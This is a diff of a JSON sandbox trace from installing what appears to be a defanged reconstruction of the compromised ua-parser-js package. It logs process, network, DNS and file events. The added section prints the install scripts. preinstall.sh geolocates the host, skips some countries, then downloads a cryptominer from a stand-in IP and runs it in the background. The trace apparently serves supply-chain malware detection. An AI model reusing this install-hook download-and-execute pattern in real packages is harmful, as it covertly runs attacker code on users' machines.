@@ -1,13 +1,13 @@
 {
- "job_id": "45b5937b-4e95-4b20-94bd-fc280298d4ec",
+ "job_id": "b4a40fdb-eb99-446f-9fb9-fdfeeb6b083d",
  "status": "completed",
  "exit_code": 0,
  "duration_s": 12.05,
  "exec_events": [
   {
-   "ts": "2026-11-01T16:01:53.681585722Z",
-   "pid": 55853,
-   "ppid": 55830,
+   "ts": "2026-11-01T23:11:55.212865149Z",
+   "pid": 80006,
+   "ppid": 79980,
    "binary": "/usr/local/bin/docker-entrypoint.sh",
    "args": "/usr/local/bin/docker-entrypoint.sh npm install --no-audit --no-fund --prefix payloads/r01-ua-parser-js",
    "parent_binary": "/usr/bin/containerd-shim-runc-v2",
@@ -15,9 +15,9 @@
    "cwd": "/work"
   },
   {
-   "ts": "2026-11-01T16:01:53.684260837Z",
-   "pid": 55853,
-   "ppid": 55853,
+   "ts": "2026-11-01T23:11:55.215259673Z",
+   "pid": 80006,
+   "ppid": 80006,
    "binary": "/usr/local/bin/npm",
    "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/r01-ua-parser-js",
    "parent_binary": "/usr/local/bin/docker-entrypoint.sh",
@@ -25,9 +25,9 @@
    "cwd": "/work"
   },
   {
-   "ts": "2026-11-01T16:01:53.685012770Z",
-   "pid": 55853,
-   "ppid": 55853,
+   "ts": "2026-11-01T23:11:55.216171930Z",
+   "pid": 80006,
+   "ppid": 80006,
    "binary": "/usr/local/bin/node",
    "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/r01-ua-parser-js",
    "parent_binary": "/usr/local/bin/npm",
@@ -35,9 +35,9 @@
    "cwd": "/work"
   },
   {
-   "ts": "2026-11-01T16:01:54.194488849Z",
-   "pid": 55910,
-   "ppid": 55853,
+   "ts": "2026-11-01T23:11:55.730561226Z",
+   "pid": 80061,
+   "ppid": 80006,
    "binary": "/usr/bin/sh",
    "args": "-c \"node preinstall.js\"",
    "parent_binary": "/usr/local/bin/node",
@@ -45,9 +45,9 @@
    "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
   },
   {
-   "ts": "2026-11-01T16:01:54.195415467Z",
-   "pid": 55911,
-   "ppid": 55910,
+   "ts": "2026-11-01T23:11:55.731993416Z",
+   "pid": 80062,
+   "ppid": 80061,
    "binary": "/usr/local/bin/node",
    "args": "preinstall.js",
    "parent_binary": "/usr/bin/sh",
@@ -55,9 +55,9 @@
    "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
   },
   {
-   "ts": "2026-11-01T16:01:54.234011189Z",
-   "pid": 55918,
-   "ppid": 55911,
+   "ts": "2026-11-01T23:11:55.768098996Z",
+   "pid": 80069,
+   "ppid": 80062,
    "binary": "/bin/sh",
    "args": "-c \"sh preinstall.sh\"",
    "parent_binary": "/usr/local/bin/node",
@@ -65,9 +65,9 @@
    "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
   },
   {
-   "ts": "2026-11-01T16:01:54.234948359Z",
-   "pid": 55919,
-   "ppid": 55918,
+   "ts": "2026-11-01T23:11:55.769028808Z",
+   "pid": 80070,
+   "ppid": 80069,
    "binary": "/usr/bin/sh",
    "args": "preinstall.sh",
    "parent_binary": "/bin/sh",
@@ -75,9 +75,9 @@
    "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
   },
   {
-   "ts": "2026-11-01T16:01:54.235955132Z",
-   "pid": 55920,
-   "ppid": 55919,
+   "ts": "2026-11-01T23:11:55.770075681Z",
+   "pid": 80071,
+   "ppid": 80070,
    "binary": "/usr/bin/curl",
    "args": "-s -m 3 https://ipinfo.io/country",
    "parent_binary": "/usr/bin/sh",
@@ -85,9 +85,9 @@
    "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
   },
   {
-   "ts": "2026-11-01T16:01:57.246529419Z",
-   "pid": 55922,
-   "ppid": 55919,
+   "ts": "2026-11-01T23:11:58.780065793Z",
+   "pid": 80073,
+   "ppid": 80070,
    "binary": "/usr/bin/curl",
    "args": "-s -m 3 http://203.0.113.10/download/jsextension -o jsextension",
    "parent_binary": "/usr/bin/sh",
@@ -95,9 +95,9 @@
    "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
   },
   {
-   "ts": "2026-11-01T16:02:00.256608633Z",
-   "pid": 55923,
-   "ppid": 55919,
+   "ts": "2026-11-01T23:12:01.791183208Z",
+   "pid": 80074,
+   "ppid": 80070,
    "binary": "/usr/bin/wget",
    "args": "-q -t 1 -T 3 http://203.0.113.10/download/jsextension -O jsextension",
    "parent_binary": "/usr/bin/sh",
@@ -107,44 +107,78 @@
  ],
  "connect_events": [
   {
-   "ts": "2026-11-01T16:01:54.244412160Z",
-   "pid": 55920,
+   "ts": "2026-11-01T23:11:55.779041295Z",
+   "pid": 80071,
    "binary": "/usr/bin/curl",
    "daddr": "198.51.100.66",
    "dport": 443,
    "family": "AF_INET",
-   "resolved_domain": "ipinfo.io"
+   "resolved_domain": "ipinfo.io",
+   "protocol": "tcp"
   },
   {
-   "ts": "2026-11-01T16:01:57.253577203Z",
-   "pid": 55922,
+   "ts": "2026-11-01T23:11:58.787176036Z",
+   "pid": 80073,
    "binary": "/usr/bin/curl",
    "daddr": "203.0.113.10",
    "dport": 80,
    "family": "AF_INET",
-   "resolved_domain": null
+   "resolved_domain": null,
+   "protocol": "tcp"
   },
   {
-   "ts": "2026-11-01T16:02:00.259531137Z",
-   "pid": 55923,
+   "ts": "2026-11-01T23:12:01.795149883Z",
+   "pid": 80074,
    "binary": "/usr/bin/wget",
    "daddr": "203.0.113.10",
    "dport": 80,
    "family": "AF_INET",
-   "resolved_domain": null
+   "resolved_domain": null,
+   "protocol": "tcp"
   }
  ],
  "dns_queries": [
   {
-   "ts": "2026-11-01T16:01:54Z",
+   "ts": "2026-11-01T23:11:55Z",
    "domain": "ipinfo.io",
    "answers": [
-    "2001:db8::66",
-    "198.51.100.66"
+    "198.51.100.66",
+    "2001:db8::66"
    ]
   }
  ],
- "stdout_tail": "\nadded 1 package in 9s\n",
+ "file_events": [
+  {
+   "ts": "2026-11-01T23:11:55.324008397Z",
+   "pid": 80006,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js/preinstall.js",
+   "package": "ua-parser-js",
+   "sha256": "d945554c9962cdf1650e269449e169cb9e6ab544a8237bc2b4c63b0324a52913",
+   "content": "// Reconstruction of ua-parser-js 0.7.29 preinstall.js: pick the platform script.\nconst { execSync } = require(\"child_process\");\nconst os = require(\"os\");\nif (os.type() === \"Linux\") {\n  try { execSync(\"sh preinstall.sh\", { stdio: \"inherit\" }); } catch (e) {}\n}\n",
+   "truncated": false
+  },
+  {
+   "path": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js/preinstall.sh",
+   "package": "ua-parser-js",
+   "sha256": "fd539350ece2b7c2878ca570865b3b929d516366e4c508179dbb56eb1e72762d",
+   "content": "# Reconstruction of ua-parser-js 0.7.29 preinstall.sh (Oct 2021), defanged.\n# Published behavior: skip victims in RU/UA/BY/KZ, then download `jsextension` (an XMRig\n# miner) from 159.148.186.228 and run it. Geolocation service: stand-in (sinkholed).\nCOUNTRY=$(curl -s -m 3 https://ipinfo.io/country 2>/dev/null)\ncase \"$COUNTRY\" in RU|UA|BY|KZ) exit 0 ;; esac\ncurl -s -m 3 http://203.0.113.10/download/jsextension -o jsextension \\\n  || wget -q -t 1 -T 3 http://203.0.113.10/download/jsextension -O jsextension\n[ -s jsextension ] && chmod +x jsextension && ./jsextension -k --tls &\nexit 0\n",
+   "truncated": false
+  },
+  {
+   "path": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js/jsextension",
+   "package": "ua-parser-js",
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "content": "",
+   "truncated": false
+  }
+ ],
+ "stdout_tail": "\nadded 1 package in 10s\n",
  "stderr_tail": "",
  "truncated": false,
  "error": null
